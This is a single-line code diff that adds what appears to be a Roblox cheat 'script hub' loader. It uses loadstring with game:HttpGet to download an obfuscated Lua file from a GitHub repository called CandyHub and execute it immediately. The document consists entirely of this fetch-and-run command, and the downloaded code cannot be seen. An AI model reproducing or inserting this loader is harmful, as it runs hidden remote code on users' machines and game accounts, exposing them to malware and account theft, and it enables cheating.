@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/FlmesCoding/CandyHub/main/obf_EisWGn0FR2N6AohC97R8PN699E9lmBvaD3ylgUEKs7nMEOihZI3AmFU90g7bF2gs.lua'))()
